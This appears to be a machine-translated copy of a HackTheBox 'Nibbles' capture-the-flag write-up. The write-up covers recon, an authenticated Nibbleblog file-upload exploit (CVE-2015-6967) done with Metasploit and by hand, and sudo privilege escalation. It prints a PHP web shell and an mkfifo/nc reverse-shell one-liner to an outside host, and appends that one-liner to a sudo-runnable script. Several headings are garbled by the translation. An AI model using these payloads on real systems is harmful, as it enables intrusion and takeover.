# 

cms 文件上传   RCE sudo-l






# 高温透射率：啃食

[0xdf.gitlab.io](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)0xdf黑客的东西

啃食是HTB上更容易的盒子之一。它托管了一个易受攻击的[半字节日志](http://www.nibbleblog.com/)实例。它有一个元潜能漏洞利用，但是如果没有 MSF 也很容易做到，所以我将展示两者。特权涉及滥用可写文件。`sudo`

*   n地图
*   站点 - 端口 80 侦察
    *   网页根目录
    *   /啃咬
        *   戈克斯特
        *   标识用户名
        *   登录到管理面板
*   远程执行代码（通过文件上传）：
    *   Metasploit –> Meterpreter
    *   用户.txt
    *   没有元潜行
*   私人
    *   根.txt

## n地图

初始 nmap 扫描仅显示网络/网络 （80） 和单信号 （22）：

    root@kali:/media/sf_CTFs/hackthebox/nibbles-10.10.10.75# nmap -sV -sC -oA nmap/initial 10.10.10.75
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-08 19:10 EST
    Nmap scan report for 10.10.10.75
    Host is up (0.099s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
    |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (EdDSA)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds
    

## 站点 - 端口 80 侦察

### 网页根目录

根页面仅返回“你好世界”消息：![1529803978686](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1529803978686.png)

但是，查看源代码可以提示下一步该去哪里：

    <b>Hello world!</b>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <!-- /nibbleblog/ directory. Nothing interesting here! -->
    

### /啃咬

At , there’s a empty instance of a blog, “Powered by Nibbleblog”: `/nibbleblog/`![main](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnibbles-main.png)

#### gobuster

As there’s not much obvious to do with this blog, let’s start a to see what pages are there. Having noticed that the links on the page were to php files, we’ll search for php and txt extensions:`gobuster`

    root@kali:/media/sf_CTFs/hackthebox# gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,txt
    
    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.75/nibbleblog/
    [+] Threads      : 20
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes : 301,302,307,200,204
    [+] Extensions   : .php,.txt
    =====================================================
    /index.php (Status: 200)
    /sitemap.php (Status: 200)
    /content (Status: 301)
    /themes (Status: 301)
    /feed.php (Status: 200)
    /admin (Status: 301)
    /admin.php (Status: 200)
    /plugins (Status: 301)
    /install.php (Status: 200)
    /update.php (Status: 200)
    /README (Status: 200)
    /languages (Status: 301)
    /LICENSE.txt (Status: 200)
    /COPYRIGHT.txt (Status: 200)
    

#### Identifying a username

In exploring the resulting paths, is interesting, and has dir lists enabled. Digging deeper, there’s a page at which reveals a user, admin, as well as the IPs that have tried to log in as it:`/nibbleblog/content``/nibbleblog/content/private/user.xml`

    <users>
      <user username="admin">
        <id type="integer">0</id>
        <session_fail_count type="integer">0</session_fail_count>
        <session_date type="integer">1520559147</session_date>
      </user>
      <blacklist type="string" ip="10.10.10.1">
        <date type="integer">1512964659</date>
        <fail_count type="integer">1</fail_count>
      </blacklist>
      <blacklist type="string" ip="10.10.14.80">
        <date type="integer">1520559030</date>
        <fail_count type="integer">4</fail_count>
      </blacklist>
    </users>
    

#### logging into admin panel

The also showed a path, and that presents a login page: `gobuster``/admin.php`![1529806773508](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1529806773508.png)

I wasn’t able to locate a password elsewhere on the blog, and nibbleblog doesn’t have a default password. Luckily, the guess of nibbles worked, and we are in: ![admin](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnibbles-admin.png)

## Remote Code Execution (via file upload):

From the results, there’s a file, and that gives us a version:`gobuster``README`

    ====== Nibbleblog ======
    Version: v4.0.3
    Codename: Coffee
    Release date: 2014-04-01
    ...
    

This version of nibbleblog is vulnerable to CVE-2015-6967, which is an authenticated arbitrary file upload, which can lead to code execution. There’s both a metasploit modules, and it’s pretty straightforwards to do manually.

### Metasploit –> Meterpreter

We’ll use to get a shell on the box.`multi/http/nibbleblog_file_upload`

    msf exploit(multi/http/nibbleblog_file_upload) > info
           Name: Nibbleblog File Upload Vulnerability
         Module: exploit/multi/http/nibbleblog_file_upload
       Platform: PHP
           Arch: php
     Privileged: No
        License: Metasploit Framework License (BSD)
           Rank: Excellent
      Disclosed: 2015-09-01
    
    Provided by:
      Unknown
      Roberto Soares Espreto <robertoespreto@gmail.com>
    
    Available targets:
      Id  Name
      --  ----
      0   Nibbleblog 4.0.3
    
    Basic options:
      Name       Current Setting  Required  Description
      ----       ---------------  --------  -----------
      PASSWORD   nibbles          yes       The password to authenticate with
      Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
      RHOST      10.10.10.75      yes       The target address
      RPORT      80               yes       The target port (TCP)
      SSL        false            no        Negotiate SSL/TLS for outgoing connections
      TARGETURI  /nibbleblog/     yes       The base path to the web application
      USERNAME   admin            yes       The username to authenticate with
      VHOST                       no        HTTP server virtual host
    
    Payload information:
    
    Description:
      Nibbleblog contains a flaw that allows an authenticated remote
      attacker to execute arbitrary PHP code. This module was tested on
      version 4.0.3.
    
    References:
      http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html
    
    msf exploit(multi/http/nibbleblog_file_upload) > run
    [*] Started reverse TCP handler on 10.10.14.157:4444
    [*] Sending stage (37543 bytes) to 10.10.10.75
    [*] Meterpreter session 2 opened (10.10.14.157:4444 -> 10.10.10.75:56052) at 2018-03-08 20:51:40 -0500
    [+] Deleted image.php
    meterpreter > shell
    Process 3816 created.
    Channel 0 created.
    id
    uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
    

### 用户.txt

从那里，我们将升级我们的 shell，然后获取用户.txt：

    python -c 'import pty;pty.spawn("/bin/bash")'
    /bin/sh: 1: python: not found
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home
    nibbler@Nibbles:/home$ ls
    nibbler
    
    nibbler@Nibbles:/home$ cd nibbler
    
    nibbler@Nibbles:/home/nibbler$ ls
    personal  personal.zip  user.txt
    
    nibbler@Nibbles:/home/nibbler$ wc -c user.txt
    33 user.txt
    
    nibbler@Nibbles:/home/nibbler$ cat user.txt
    b02ff32b...
    

### 没有元潜行

[此博客](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)提供了有关CVE-2015-6967以及如何利用它的良好文章。

1.  获取管理员凭据 - 我们已经拥有此凭据。
2.  激活“我的图像”插件。如果我们单击管理页面左侧菜单上的“插件”，则会将我们带到已安装插件的列表：因此我们可以单击易受攻击的插件“我的图像”下的“配置”。我们得到了一个上传表格：![1529838022141](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1529838022141.png)![1529838333058](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1529838333058.png)
3.  使用表单上传 cmd.php。
    
        root@kali:~/hackthebox/nibbles-10.10.10.75# cat cmd.php
        <?php system($_REQUEST['cmd']); ?>
        
    
4.  访问`http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=[command]` ![1529838501643](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1529838501643.png)

无论出于何种原因，我发现我与这个网站的会话持续时间不长（可能是其他用户登录并踩到我的shell，因为他们都被命名为image.php）。所以让我们得到一个真正的壳。我们将 php 更改为：

    root@kali:~/hackthebox/nibbles-10.10.10.75# cat callback.php
    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"); ?>
    

然后重复上述步骤，并在访问时：`image.php`

    root@kali:~/hackthebox/nibbles-10.10.10.75# nc -lnvp 8082
    listening on [any] 8082 ...
    connect to [10.10.15.154] from (UNKNOWN) [10.10.10.75] 55268
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
    

## 私人

Either through running or just by checking , we’ll see the following:`LinEnum.sh``sudo -l`

    nibbler@Nibbles:/$ sudo -l
    sudo: unable to resolve host Nibbles: Connection timed out
    Matching Defaults entries for nibbler on Nibbles:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User nibbler may run the following commands on Nibbles:
        (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
    

So with no password, we can run .`monitor.sh`

`monitor.sh` is a publicly available script:

```

    nibbler@Nibbles:/home/nibbler/personal/stuff$ head monitor.sh
                      ####################################################################################################
                      #                                        Tecmint_monitor.sh                                        #
                      # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                      # If any bug, report us in the link below                                                          #
                      # Free to use/edit/distribute the code below by                                                    #
                      # giving proper credit to Tecmint.com and Author                                                   #
                      #                                                                                                  #
                      ####################################################################################################
    #! /bin/bash
    # unset any variable which system may be using
```

    

But it doesn’t really matter, since the script is world-writable:

   
```
 nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
    total 4
    -rwxrwxrwx 1 nibbler nibbler 80 Jun 24 07:27 monitor.sh
```

    

In fact, if you are on the free, you’re very likely to find this file completely overwritten with other people’s privesc.

Rather than bluntly overwriting the script, we’ll append our shell to the end:

  
```
  nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
    < /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
    nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
    

    root@kali:/media/sf_CTFs/hackthebox/nibbles-10.10.10.75# nc -lnvp 8083
    listening on [any] 8083 ...
    connect to [10.10.15.154] from (UNKNOWN) [10.10.10.75] 52184
    # id
    uid=0(root) gid=0(root) groups=0(root)
```

    

### 根.txt

现在很容易抓住根标志：


```
    # cd /root
    # wc -c root.txt
    33 root.txt
    # cat root.txt
    b6d745c0...
```

    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)